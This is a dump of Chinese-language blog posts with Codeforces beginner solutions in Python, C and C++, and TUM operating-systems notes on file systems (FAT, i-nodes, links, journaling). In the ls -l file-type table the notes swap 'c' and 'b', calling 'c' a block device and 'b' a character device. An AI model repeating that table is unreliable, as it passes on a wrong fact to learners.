Round","slug":"算法竞赛/Codeforce/800/Codeforce-Next-Round","date":"2025-03-25T21:17:50.000Z","updated":"2025-04-02T11:05:31.486Z","comments":true,"path":"2025/03/25/算法竞赛/Codeforce/800/Codeforce-Next-Round/","permalink":"https://archer-baiyi.github.io/en/2025/03/25/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/800/Codeforce-Next-Round/","excerpt":"","text":"题目描述 思路先统计前 k 个分数中大于 0 的数量。因为分数是递减排列的，只需继续统计从第 k 个位置开始，所有与第 k 个分数相等的连续分数个数。最后的总合就是结果。 代码Python12345678910111213141516171819n_k = input().split()n = int(n_k[0])k = int(n_k[1])n_list = list(map(int, input().split()))comp = n_list[k-1]n1_list = n_list[:k] for i in range(k,n): if n_list[i] == comp: n1_list.append(n_list[i]) else: breakcount = sum(1 for x in n1_list if x &gt; 0)# print(n1_list)print(count) 优化： 1234n, k = map(int, input().split())scores = list(map(int, input().split()))threshold = scores[k - 1]print(sum(s &gt;= threshold and s &gt; 0 for s in scores)) 用numpy的： 1234567import numpy as npn, k = map(int, input().split())scores = np.array(list(map(int, input().split())))threshold = scores[k - 1]result = np.sum((scores &gt;= threshold) &amp; (scores &gt; 0))print(result) C12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;int main() { int n, k; scanf(\"%d %d\", &amp;n, &amp;k); int scores[100]; // 假设最大不超过 100 个分数 for (int i = 0; i &lt; n; i++) { scanf(\"%d\", &amp;scores[i]); } int threshold = scores[k - 1]; // 第 k 个选手的分数（索引从 0 开始） int count = 0; // 前 k 个中统计 &gt;0 且 &gt;= threshold 的分数 for (int i = 0; i &lt; k; i++) { if (scores[i] &gt;= threshold &amp;&amp; scores[i] &gt; 0) { count++; } } // 从第 k 个开始，统计连续等于 threshold 的（也必须 &gt;0） for (int i = k; i &lt; n; i++) { if (scores[i] == threshold &amp;&amp; scores[i] &gt; 0) { count++; } else { break; } } printf(\"%d\\n\", count); return 0;} C++12345678910111213141516171819202122232425#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;int main() { int n, k; cin &gt;&gt; n &gt;&gt; k; vector&lt;int&gt; scores(n); for (int i = 0; i &lt; n; ++i) { cin &gt;&gt; scores[i]; } int threshold = scores[k - 1]; int count = 0; for (int i = 0; i &lt; n; ++i) { if (scores[i] &gt;= threshold &amp;&amp; scores[i] &gt; 0) { count++; } } cout &lt;&lt; count &lt;&lt; endl; return 0;} 用ranges： 12345678910111213141516171819202122232425#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;ranges&gt;using namespace std;namespace ranges = std::ranges;int main() { int n, k; cin &gt;&gt; n &gt;&gt; k; vector&lt;int&gt; scores(n); for (int&amp; score : scores) { cin &gt;&gt; score; } int threshold = scores[k - 1]; auto advancers = scores | ranges::views::filter([threshold](int x) { return x &gt;= threshold &amp;&amp; x &gt; 0; }); cout &lt;&lt; ranges::distance(advancers) &lt;&lt; endl; return 0;} Remark1. 如果只是 1n,k = input().split() 的话只会将n,k赋值成2个string，而不是int，所以需要这一步将它们转成2个int： 123n_k = input().split()n = int(n_k[0])k = int(n_k[1]) list那里的处理也是同理。 2. 如果直接写 12345678n_list = list(map(int, input().split()))comp = n_list[k-1]for i in range(k,n): if n_list[i] == comp: n_list.append(n_list[i]) else: break 的话，会导致遍历一个列表的同时又在修改它，会导致结果不可控。 但就算是改成了 12345678910n_list = list(map(int, input().split()))comp = n_list[k-1]n1_list = n_listfor i in range(k,n): if n1_list[i] == comp: n_list.append(n1_list[i]) else: break 也不对，因为在python里n1_list 并不是 n_list 的复制品，而只是同一个列表的两个名字。这样只是让 n1_list 和 n_list 指向同一个列表对象，修改任何一个，都会影响另一个。所以会出现跟之前一模一样的结果。 创建独立的副本需要： 123456n1_list = n_list[:]# 或n1_list = list(n_list)# 或import copyn1_list = copy.copy(n_list) （注意：python里的list[a:b]是前闭后开，所以这个不包含list[b]） 3. 假如这道题的input是乱序的，那么需要先将input排序了再进行后续操作。 python的话非常简单： 12345678910111213input = [3, 1, 4, 1, 5, 9]#升序：input.sort() # 原地排序，修改 input 本身# 或者input = sorted(input) # 返回新排序后的列表#降序：input.sort(reverse=True)# 或者input = sorted(input, reverse=True) c就很麻烦了： 12345678910111213141516171819#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int cmp(const void *a, const void *b) { return (*(int *)a - *(int *)b); // 升序 // return (*(int *)b - *(int *)a); // 降序}int main() { int arr[] = {3, 1, 4, 1, 5, 9}; int n = sizeof(arr) / sizeof(arr[0]); qsort(arr, n, sizeof(int), cmp); // 排序调用 for (int i = 0; i &lt; n; i++) { printf(\"%d \", arr[i]); } return 0;} 因为 qsort()（通用的排序函数）是泛型函数，它不能直接比较 int 或 float，我们必须手动告诉它“怎么比较两个值”。 相比之下c++就会方便很多，因为有内置的函数： 12345678910111213141516171819#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;functional&gt; // 降序会需要using namespace std;int main() { int arr[] = {3, 1, 4, 1, 5, 9}; int n = sizeof(arr) / sizeof(arr[0]); sort(arr, arr + n); // 默认升序排序 // sort(arr, arr + n, greater&lt;int&gt;()); 降序 for (int i = 0; i &lt; n; i++) { cout &lt;&lt; arr[i] &lt;&lt; \" \"; } return 0;} 也可以直接用cpp的 vector&lt;int&gt; 1234567891011121314151617#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;using namespace std;int main() { vector&lt;int&gt; v = {3, 1, 4, 1, 5, 9}; sort(v.begin(), v.end()); // 升序 // sort(v.begin(), v.end(), greater&lt;int&gt;()); // 降序 for (int x : v) { cout &lt;&lt; x &lt;&lt; \" \"; } return 0;}","categories":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/en/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/en/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/en/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/en/tags/Codeforce/"},{"name":"800","slug":"800","permalink":"https://archer-baiyi.github.io/en/tags/800/"}]},{"title":"Codeforce-Bit++","slug":"算法竞赛/Codeforce/800/Codeforce-Bit","date":"2025-03-25T17:57:32.000Z","updated":"2025-04-02T11:05:16.379Z","comments":true,"path":"2025/03/25/算法竞赛/Codeforce/800/Codeforce-Bit/","permalink":"https://archer-baiyi.github.io/en/2025/03/25/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/800/Codeforce-Bit/","excerpt":"","text":"题目描述 思路对于每一行命令检测+是否在里面就好。 代码Python123456789n = int(input())x=0for _ in range(n): op = input() if \"+\" in op: x += 1 else: x -= 1print(x) C1234567891011121314151617181920#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() { int n, x = 0; scanf(\"%d\", &amp;n); char op[5]; for (int i = 0; i &lt; n; i++) { scanf(\"%s\", op); if (strchr(op, '+')) { x += 1; } else { x -= 1; } } printf(\"%d\\n\", x); return 0;} C++","categories":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/en/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/en/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/en/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/en/tags/Codeforce/"},{"name":"800","slug":"800","permalink":"https://archer-baiyi.github.io/en/tags/800/"}]},{"title":"Codeforce - Team","slug":"算法竞赛/Codeforce/800/Codeforce-Team","date":"2025-03-25T17:42:06.000Z","updated":"2025-04-02T11:05:46.927Z","comments":true,"path":"2025/03/25/算法竞赛/Codeforce/800/Codeforce-Team/","permalink":"https://archer-baiyi.github.io/en/2025/03/25/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/800/Codeforce-Team/","excerpt":"","text":"题目描述 一共有 n 道题目，而对于每道题，他们会选择是否去做这题：只有当三个人中至少有两个人对这题有把握时，他们才会决定去做。 思路直接计算每行的和是否大于等于2。 代码Python123456789n = int(input()) count = 0 for _ in range(n): a, b, c = map(int, input().split()) if a + b + c &gt;= 2: count += 1 print(count) C1234567891011121314151617#include &lt;stdio.h&gt;int main() { int n, a, b, c; int count = 0; scanf(\"%d\", &amp;n); for (int i = 0; i &lt; n; i++) { scanf(\"%d %d %d\", &amp;a, &amp;b, &amp;c); if (a + b + c &gt;= 2) { count++; } } printf(\"%d\\n\", count); return 0;} C++123456789101112131415161718#include &lt;iostream&gt;using namespace std;int main(){ int n; cin &gt;&gt; n; int a,b,c; int count=0; for( int i=0; i &lt; n; i++){ cin &gt;&gt; a &gt;&gt; b &gt;&gt; c; if(a+b+c &gt;1){ count +=1; } } cout &lt;&lt; count; return 0;}","categories":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/en/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/en/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/en/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/en/tags/Codeforce/"},{"name":"800","slug":"800","permalink":"https://archer-baiyi.github.io/en/tags/800/"}]},{"title":"Codeforce - Way Too Long Words 题解","slug":"算法竞赛/Codeforce/800/Codeforce-A-Way-Too-Long-Words","date":"2025-03-25T17:28:41.000Z","updated":"2025-04-02T11:04:46.144Z","comments":true,"path":"2025/03/25/算法竞赛/Codeforce/800/Codeforce-A-Way-Too-Long-Words/","permalink":"https://archer-baiyi.github.io/en/2025/03/25/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/800/Codeforce-A-Way-Too-Long-Words/","excerpt":"","text":"题目描述 简单来讲就是需要”简化“长单词。 思路先判断单词长度。如果小于等于10就不用管，如果超过10，则写成：首字母 + 中间的字母数量 + 末尾字母。 代码Python1234567n = int(input())for _ in range(n): word = input() if len(word) &gt; 10: print(word[0] + str(len(word) - 2) + word[-1]) else: print(word) C123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() { int n; scanf(\"%d\", &amp;n); char word[101]; for (int i = 0; i &lt; n; i++) { scanf(\"%s\", word); int len = strlen(word); if (len &gt; 10) { printf(\"%c%d%c\\n\", word[0], len - 2, word[len - 1]); } else { printf(\"%s\\n\", word); } } return 0;} C++12345678910111213141516171819202122#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main() { int n; cin &gt;&gt; n; string word; for (int i = 0; i &lt; n; ++i) { cin &gt;&gt; word; int len = word.length(); if (len &gt; 10) { cout &lt;&lt; word[0] &lt;&lt; len - 2 &lt;&lt; word[len - 1] &lt;&lt; endl; } else { cout &lt;&lt; word &lt;&lt; endl; } } return 0;}","categories":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/en/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/en/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/en/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/en/tags/Codeforce/"},{"name":"800","slug":"800","permalink":"https://archer-baiyi.github.io/en/tags/800/"}]},{"title":"GBS 7 Dateisystem 文件系统","slug":"TUM info 笔记/GBS/GBS-7-Dateisystem-文件系统","date":"2025-03-24T20:53:38.000Z","updated":"2025-04-26T18:31:10.127Z","comments":true,"path":"2025/03/24/TUM info 笔记/GBS/GBS-7-Dateisystem-文件系统/","permalink":"https://archer-baiyi.github.io/en/2025/03/24/TUM%20info%20%E7%AC%94%E8%AE%B0/GBS/GBS-7-Dateisystem-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/","excerpt":"操作系统基础相关笔记","text":"Einführung首先我们需要先明确为什么需要文件系统： 进程在运行期间只能使用其虚拟地址空间来存储数据：容量有限。 当进程结束时，其虚拟地址空间中的数据会丢失：无法实现持久的、长期的数据存储。 在虚拟进程地址空间中存储数据只允许有限的共享访问：不能实现同时并行使用。 所以我们需要文件系统来提供更高级别，更持久、更可靠并且可共享的数据存储功能。 也就意味着我们会对文件系统有着以下要求： 提供存储空间以容纳大量数据（Speicherplatz für (sehr) große Datenmengen bereitstellen） 防止数据丢失（Datenverlust vermeiden） 支持并发访问数据（Nebenläufigen Zugriff auf Daten ermöglichen） 多个进程应能够同时访问数据。 文件系统的基本作用是将硬盘上的原始数据块组织成结构良好的文件，使得用户和程序可以方便地存取数据。 具体的任务包括： 可以描述文件的数据结构（Datenstrukturen zur Beschreibung von Dateien） 实现文件（Implementierung der Dateien） 命名（Benennung） 允许访问文件（Zugriffe auf Dateien ermöglichen） 防止未授权访问（Schutz vor unberechtigten Zugriffen） 常见的文件系统有： FAT-16/32 (DOS) 老式的微软文件系统 NTFS (Windows NT) 微软当前主流的文件系统 Ext2/3/4 (Linux) Linux 系统中广泛使用的文件系统系列（Ext4是目前主流） 硬盘硬盘作为长期存储的媒介，可以被看作是一串固定大小的线性数据块序列（ eine lineare Sequenz von Blöcken fester Größe ）。这里的块（Block）就是硬盘读写的基本单位（Einheit）。这里的块的大小是由操作系统决定的，和硬盘的sector没有直接的大小关系。 而为了更好的管理硬盘的存储空间，我们需要操作系统对硬盘属性进行虚拟化，也就是所谓的文件概念（Datei-Konzept）： 文件是逻辑上的管理单元。（Dateien sind logische Verwaltungs-Einheiten） 文件可以持久地存储任意信息。（Dateien speichern beliebige Informationen persistent (dauerhaft)） 文件系统对块的存储位置、空闲状态等进行了抽象处理。（Datei abstrahiert davon, wo die Blöcke gespeichert sind, welche Blöcke frei sind usw.） 进程可以通过系统调用来创建、写入、读取和删除文件。（erstellen, schreiben, lesen, löschen） 文件不仅被用户程序使用，也被系统软件使用。（ Dateien werden sowohl von Benutzerprogrammen als auch von der Systemsoftware verwendet） 文件 （Dateien）我们首先通过用户视角来了解一下文件系统：就从我们日常接触的文件开始。 文件作为被管理的单位（zu verwaltende Einheiten），可以被不同的进程使用。所有文件都必须有名字，没有统一的命名规则。一般情况下名字会由2部分组成：名字（Name）和扩展名（Extension）。而有些系统（比如说Windows）会解析扩展名，有些则不会（比如UNIX）。 文件可以采用三种不同的结构方式： 非结构化（Unstrukturiert） 操作系统只把文件当作一串字节（eine Folge von Bytes）（适用于 UNIX 和 Windows）来看待，它不会尝试去理解文件里面到底是什么内容。 优点：用户程序有更大的灵活性 固定大小记录的序列（Sequenzen von Einträgen fester Größe） 每条记录有固定的大小和结构，比如每行只能写 80 个字符。现代的操作系统已经很少使用这种方式了。 具有不同大小记录的树结构（Ein Baum mit Einträgen unterschiedlicher Größe） 每条记录都有一个Key，这些Key都是有序存储的。适合在大型计算机的操作系统（Großrechner-BS ）中用于处理大量数据。 文件类型（Dateitypen）操作系统支持多种文件类型： 普通文件（ Dateien，regular files）： 包含用户数据的文件，比如说： 文本文件（Text-Dateien）： Bestehen aus Zeilen, die durch carriage return （回车符，\\r）und/oder linefeed Zeichen（换行符，\\n） abgeschlossen sind. 二进制文件（Binärdateien）：具有特定格式，比如说可执行文件、压缩包等。 目录（Verzeichnisse，directories）： 是用于组织和管理文件系统中结构的系统文件。 块设备文件（Block Special Files） 字符设备文件（Character Special Files） 在linux种可以用 ls -l 来查看文件类型： 第一位字符 文件类型 - 普通文件 d 目录 c 块设备文件 b 字符设备文件 例子： 1234drwxr-xr-x 2 user user 4096 Mar 26 test_folder-rw-r--r-- 1 user user 1234 Mar 26 notes.txtcrw-rw---- 1 root tty 4, 0 Mar 26 /dev/tty0brw-rw---- 1 root disk 8, 0 Mar 26 /dev/sda 可执行文件的结构： 压缩文件的结构： 文件访问方式（Dateizugriff）顺序访问（Sequential access）（只有在很老的操作系统里才会出现了。） 在这种访问下，进程需要按顺序读取文件中的字节（或记录），文件的部分内容不能跳过，适合磁带类存储设备。 比如说读一本书的时候只能一页一页往后翻，不能直接跳到第50页。 随机访问（Random-access）进程可以按任意顺序读取文件中的字节（或记录），在数据库系统中尤其重要（快速定位记录）。 UNIX 系统中，lseek 系统调用可以改变“读写指针”位置： 1lseek(fd, 1024, SEEK_SET); fd是文件描述符，1024是偏移量（offset）（单位是Byte），SEEK_SET 则是定位方式，有几种选择： 常量名 含义 SEEK_SET 从文件开头开始偏移 offset 字节 SEEK_CUR 从当前位置开始偏移 SEEK_END 从文件末尾开始偏移 （offset需要调整为负数） 例子： 12345678910111213141516171819202122232425262728293031#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;int main(int argc, char *argv[]) &#123; int fd; // 文件描述符 char buf[128]; // 缓冲区，用于读取128字节内容 // 打开文件 &quot;myfile.txt&quot;，只读方式 fd = open(&quot;myfile.txt&quot;, O_RDONLY); if (fd &lt; 0) // 如果打开失败，退出 return EXIT_FAILURE; // 将文件读写位置移动到从文件头开始的第1024个字节 if (lseek(fd, 1024, SEEK_SET) &lt; 0) return EXIT_FAILURE; // 从当前位置读取128字节到缓冲区buf中 if (read(fd, buf, 128) &lt; 0) return EXIT_FAILURE; // 打印读取到的内容 printf(&quot;%s\\n&quot;, buf); // 关闭文件 close(fd); // 正常退出 return EXIT_SUCCESS;&#125; 文件属性（Dateiattribute）每份文件除了文件名和文件内容外还会附带一些其他信息：元信息（Meta-Informationen）。 元信息包含： 对文件的访问权限 比如说在UNIX里，权限赋予对象分成 所有者（Owner）、用户组（Group）、所有人（All）。而权限种类有r（读取）、w（写入）、x（执行） 例子： 1-rwxr--r-- 标志位（flags）：控制文件的某些属性 比如说可以将文件设置为隐藏、标识为二进制或归档文件等。 详见： 文件操作（Datei-Operationen）常见的文件操作都是通过系统调用提供的： 创建和删除文件 open （打开）: 在访问一个文件之前，必须先打开它。这会让操作系统把文件属性和其他信息加载到内存中，方便快速处理。open() 系统调用返回一个文件描述符（file descriptor），这是一个小的整数，用来标识这个打开的文件。 unlink （删除） 后续对文件的访问（通过文件描述符） close （关闭） 使用文件描述符来关闭文件，释放内部数据结构资源。 read （读取） 指定要读取的数据以及一个缓冲区（buffer），读取的内容将被放入该缓冲区。 一定要提前创建一个缓冲区！ write （写入） 将数据写入到当前文件指针所在的位置，注意原有数据可能会被覆盖。 seek （定位） 移动文件指针到指定位置（之后可以从该位置读取或写入）。（见上面随机访问那里的例子） 代码例子： 12345678910111213141516171819202122232425262728293031323334#include &lt;stdlib.h&gt; #include &lt;fcntl.h&gt; // 包含 open() 的相关定义和文件权限#include &lt;unistd.h&gt; // 包含 read(), write(), close() 的声明#define BUF_SIZE 4096 // 定义缓冲区的大小int main (int argc, char *argv[]) &#123; int fd_in, fd_out, count; // 2个文件描述符 和 读写字节数计数器 char buf[BUF_SIZE]; // 缓冲区 // 如果参数个数不为3（程序名 + 输入文件 + 输出文件），则失败退出 if (argc != 3) return EXIT_FAILURE; // 打开输入文件，只读模式（O_RDONLY） if ((fd_in = open(argv[1], O_RDONLY)) == -1) return EXIT_FAILURE; // 打开或创建输出文件，只写模式，权限为用户可读写（rw- --- ---） if ((fd_out = open(argv[2], O_WRONLY | O_CREAT, S_IRUSR | S_IWUSR)) == -1) return EXIT_FAILURE; // 读取输入文件的内容并写入到输出文件中，直到读完 while ((count = read(fd_in, buf, BUF_SIZE)) &gt; 0) &#123; // 如果写入失败或未能写入全部内容，返回失败 if (write(fd_out, buf, count) &lt;= 0) return EXIT_FAILURE; &#125; // 关闭两个文件描述符 close(fd_in); close(fd_out); return EXIT_SUCCESS; // 成功结束程序&#125; 目录（Verzeichnisse）文件系统通过目录来组织文件。而目录本质上是一个特殊的文件，它只包含管理信息（比如：文件名、路径、指针等）。目录使文件系统支持层级管理（hierarchische Verwaltung），让结构更清晰、查找更高效。 下面这两种是比较常见的目录结构： 1. 单层目录结构（Single-Level Verzeichnisstrukturen） 在这种结构里只有一个目录（根目录，root directory）用于存放所有文件。目前依然在一些嵌入式系统中使用。 优点：文件可以很快被找到（因为都在同一个地方）。 缺点：所有用户共享同一个目录，没有分层结构。 2. 层次型目录结构（Hierarchische Verzeichnisstrukturen） 这种会将相关的文件以分层方式组织在目录中，每个用户拥有自己专属的主目录，并可包含子目录。 路径名（Pfadnamen）路径名是为了在树状结构的文件系统中为文件命名，一般分3种： 1. 绝对路径名（Absolute Pfadnamen） 路径从根目录（Root-Verzeichnis）开始，一直到目标文件。 注意：UNIX/Linux 中用 / ，Windows 中用 \\ 。 例子： 1/tum/git/gbs/uebungsbetrieb/ws18/09/c-files/mem.c 2. 相对路径名（Relative Pfadnamen） 路径是相对于当前工作目录（Current Working Directory）而言的。 比如当前路径是 1/tum/git/gbs/uebungsbetrieb/ws18/09 的时候，就可以这样引用文件：123blatt09.pdf或者c-files/mem.c 3. 特殊路径 . 表示当前目录，.. 表示上一级目录。 例子： 假设当前路径是 1ws18/09/ 可以用 12cp ../08/gbsuebung.cls .# 从当前目录的上一级目录中的 08 子目录里，复制 gbsuebung.cls 文件到当前目录中 文件系统从现在开始我们从实现角度（Implementierungs-Sicht）来了解文件系统：它内部是如何实现各种功能的。 文件系统布局（Dateisystem-Layout）硬盘会被划分为多个分区（Partitionen），每个分区可以独立存储一个文件系统，彼此之间互不影响。 位于 Sektor 0 的是主引导记录（MBR，Master Boot Record）。里面存储了一个分区表（Partitions-Tabelle），用于纪录每个分区的起始和结束地址。 在启动电脑时（Booten），BIOS（或现代的 UEFI）会读取 MBR，执行 MBR 程序，然后根据分区表（Partitions-Tabelle）定位到活动分区（aktiven Partition），读取并执行该分区的第一个块 Boot Block 中的代码，引导操作系统加载。 每个分区内部的结构会随着文件系统的不同而变化。 上面图片里展示的是UNIX/Linux中文件系统的例子： 超级块（Superblock） 存储关于整个文件系统的关键信息，包括 Magic Number（识别文件系统类型的标识）, Anzahl der Blöcke, etc. 空闲块信息（Informationen über freie Blöcke） （上一章的内容）可以通过位图（Bitmap）或者指针链表（Pointer List）实现。 文件描述符集合（i-nodes） 文件和目录 文件的存储与实现方式（Implementierung von Dateien）文件系统管理那些用于保存文件内容的磁盘块（Blöcke），但每个文件的数据都被分成多个块，系统怎么样可以知道这些块在哪儿呢？ 以下是管理文件内容所用的三种主要实现方案： 连续分配（Contiguous Allocation）文件被视为硬盘上一串连续的块，也就是说文件的所有数据块在物理磁盘上是挨在一起的（如下图）。 优点： 实现简单（Einfache Implementierung） 读取性能高（Lesen ist sehr performant） 由于数据连续，只需一次磁头定位就可以一次性把整个文件读完，非常高效。 缺点： 外部碎片问题（Externe Fragmentierung） 指随着文件的创建与删除（也就是外部原因）会产生很多小块，导致很难找到一大块连续空间给新文件。（如下图所示） （interne Fragmentierung 指的是想Buddy Algorithm那样算法本身导致的碎片化。） 所以比较适合只读介质（Read-Only-Medien），比如说CD-ROM，DVD，BluRay-Disks 链式分配（Linked List Allocation）使用一个链表管理所以文件使用的块，每个块的开头包含指向下一个块的指针。 优点： 不会浪费空间 不像连续分配那样需要一整段连续空闲区域，所有零散的空闲块都可以利用 缺点： 随机访问性能差（Niedrige Performance bei Random-Access） 因为如果要访问第 n 块，必须先读取完前 n-1 块。 每个块要占用一点空间存指针 导致可用空间不是标准的 2 的幂（keine 2er-Potenz）。 与操作系统块大小兼容性差 因为许多系统要求块大小是固定的（例如 512B、1024B、2048B 等），指针占了空间后可能导致不便于按块读取。 针对提到的这些问题我们可以在此基础上进行一点改良： FAT 文件分配表（Linked List Allocation mit File Allocation Table）我们现在将所有指针集中存储在一张表中（FAT），放在主存（Hauptspeicher）中管理。 例子： 我们现在有2份文件： A：4, 7, 2, 10, 12 (-1 = Ende der Liste) B: 6, 3, 11, 14 (-1) 优点： 每个块不会浪费存储空间（kein Verschnitt） 随机访问（Random-Access）更快 只需要在内存中操作表即可 缺点： FAT 表必须常驻内存（RAM），会消耗大量内存。（磁盘空间越大FAT也越大） i-nodes（索引节点）每个文件都由一个i-node数据结构来表示，i-node中会包含文件的元数据（Dateiattribute）以及磁盘块的地址（ Adressen）。 优点： 内存占用低 因为只需将打开的文件的i-node加载到内存中。 可扩展性强 所需内存空间只与“同时打开的文件数”有关，而不是整个磁盘容量。 缺点： i-node 能存的地址数量是固定的 为了解决这个问题可以用多级间接地址： 比如说一级间接、二级间接、三级间接（Indirekte, doppelt indirekte und dreifach indirekte Blöcke），即最后的地址不是数据块，而是指向一个包含更多地址的“块地址表”（即指针块）。 在 ext2/3/4 中，每个 inode 都包含 12 个直接指向文件数据块的 direct block 指针。 目录（Verzeichnissen）操作系统需要通过解析路径名来找到硬盘上的实际文件位置。 一个目录其实就是一组目录项（Verzeichniseintrag，directory entry）的集合。当操作系统通过一个路径打开文件时，会挨个查找对应的目录项。 一个目录项会包含以下信息： 文件名 定位信息（Adress-Informationen, um die gesuchte Datei zu lokalisieren） 文件属性（Datei-Attribute） （注意，目录项和文件是2个不同的东西。目录项实际上只是一条纪录，用于指向一个文件或者子目录，并不会存储文件内容（用于导航）。而文件是实际存储数据的对象） 文件属性的存储有2种常见的方式： 1. 直接存储在目录项中： 每个目录项不仅包含文件名，还直接包含这个文件的属性信息。 2. 存储在 i-nodes 中： 每个目录项只包含文件名以及一个指向 i-node 的引用（编号或指针），文件的所有属性都集中保存在 i-node 中。 文件名的存储因为我们希望可以使用任意长度的文件名，所以需要考虑这些不同长度的文件名该怎么存储。 首先想到的便是 1. 固定文件名长度，比如说限制每份文件的文件名在255个字符以内。但是这样一来肯定需要给每份文件的文件名255个字符的位置，由于不是每份文件的名字都有这么长，很容易导致内存或者磁盘空间的浪费。 所以我们可以根据这个问题将这个方法改良一点： 2. 允许文件使用任意长度的文件名，然后专门用一块空间记录当前文件名的长度。（如下图） 但是这种方法同样也有一个很大的问题：因为文件名长度的不同意，创建和删除文件容易导致存储空间碎片化。为了解决这个问题我们可以考虑将所有的文件名集中存储，也就是: 3. 只存储文件属性以及一个指向堆（Heap）里存储文件名位置的指针。（如下图） 尽管已经改善很多了，但这个方案依旧不够完美：在包含大量条目的目录中查找文件会很慢（Suchen von Dateien in Verzeichnissen mit vielen Einträgen ist langsam）。所以我们可以 4. 在3的基础上引入哈希表来提高索引效率： 在每个目录中使用一个哈希表，通过对文件名进行哈希计算来得到目录项的索引。目录项中的哈希冲突（Kollisionen）则通过链表来处理。 链接（Links）为了让（不同）用户在不同路径下可以打开同一份文件，我们需要引入链接这个机制。 链接分为2种： 硬链接（Hard Links） 目录项不是直接指向文件数据，而是指向i-node，允许多个目录项指向同一个 i-node。注意，在硬链接里没有“主链接”或“次链接”的区别，所有硬链接是平等的。每个 i-node 会记录引用计数（ref count），当引用计数归零时，说明没有目录再指向它，就可以删除这个文件了。 （这也解释了 UNIX 删除命令叫 unlink()，因为它实际上是取消一个目录项到 i-node 的链接，而不是马上删除文件。） 软链接/符号链接（Symbolic Links）创建一个特殊类型的文件，里面保存的是目标文件的路径名。 软链接类似于Windows里的快捷方式，但并不完全一样。软连接是文件系统级别支持，而快捷方式则是应用层支持。这意味着系统层面会自动解析软链接，但是Windows里的快捷方式需要Shell或资源管理器解析。 日志文件系统（Journaling-Dateisysteme）主要是为了保证系统崩溃后的数据一致性，类似于Datenbank里的Transaktionsverwaltung。 在 UNIX 下删除一个文件需要3个步骤： 从目录中移除文件的目录项（Entferne die Datei aus ihrem Verzeichnis） 将文件对应的 i-node 释放（Gib den i-node in den Pool der freien i-nodes frei） 将文件占用的磁盘数据块标记为“可用”（Markiere alle von der Datei belegten Festplatten Blöcke als frei） 但如果在某一步结束后系统发生了崩溃，就会导致很严重的问题，比如说数据丢失或者是空间泄露。 所以我们需要日志文件系统（Journaling-Dateisysteme）来预防这些问题：会先将所有对文件系统的更改操作记录在日志区域（Journal）中，然后才实际执行。这样一来所有操作都可以从日志中恢复或重做，确保一致性。 具体操作流程： 首先创建一个日志条目，描述即将执行的三项操作。（Erstellen eines Log-Eintrags, der die drei Operationen beschreibt） 将该日志写入磁盘的日志区。（Speicherung in Journal auf der Platte） 然后需要重新读取日志内容以确认是否正确写入。 执行实际的3步操作。（Ausführen der drei Operationen） 每完成一步操作，都在磁盘上记录一次“进度”，表示该操作已完成。（Abschluss jeder Operation auf der Platte vermerkt: Fortschrittsbericht） 三个操作都成功完成后，删除日志条目。 然后在系统重启或者发生崩溃后会进行以下操作： 首先检查日志内容。（Inspektion des Journals） 如果发现某个操作没执行完，那么会重新执行所有操作。 只不过这些都一个共同的前提：所有操作必须是幂等的（idempotent），即进行1次操作与进行n次（相同的）操作得到的结果是一样的。 例子： 将一块Block标记成frei：是idempotent的。 把空闲块简单地加到“空闲块列表末尾”：不是idempotent的，需要改成 先检查一下块n是否已经在空闲列表中，如果没有，再加入。 